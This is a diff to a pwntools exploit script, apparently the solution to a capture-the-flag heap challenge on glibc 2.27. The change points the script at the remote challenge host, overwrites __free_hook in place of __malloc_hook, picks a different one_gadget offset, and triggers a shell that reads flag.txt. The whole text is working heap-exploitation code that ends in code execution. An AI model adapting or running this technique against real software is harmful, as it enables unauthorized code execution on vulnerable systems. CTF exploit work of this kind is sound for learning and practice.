@@ -10,10 +10,10 @@ ld = ELF("./ld-2.27.so")
 
 context.binary = exe
 
-# host = "mc.ax"
-# port = 32526
-host = "localhost"
-port = 5000
+host = "mc.ax"
+port = 32526
+# host = "localhost"
+# port = 5000
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -101,21 +101,20 @@ challenge_do_del(b"4")
 
 challenge_do_del(b"6")
 
-challenge_do_str(str(0xa00).encode(), b"a"*(0x480 + 0x10) + p64(libc.symbols['__malloc_hook']))
+challenge_do_str(str(0xa00).encode(), b"a"*(0x480 + 0x10) + p64(libc.symbols['__free_hook']))
 
 challenge_do_str(str(0x60).encode(), b"a")
 
-# one_gadget = 0x4f2be
-# one_gadget = 0x4f2c5
-# one_gadget = 0x4f322
-one_gadget = 0x10a38c
+# one_gadget = 0x4f29e
+# one_gadget = 0x4f2a5
+one_gadget = 0x4f302
+# one_gadget = 0x10a2fc
 
 challenge_do_str(str(0x60).encode(), p64(libc.address + one_gadget))
 
-sla(b"> ", b"1")
-sla(b"size? ", b"10")
+challenge_do_del(b"5")
 
-io.sendline(b"ls")
-
-io.interactive()
+io.sendline(b"cat flag.txt")
+log.success(io.recvline())
+io.close()
 
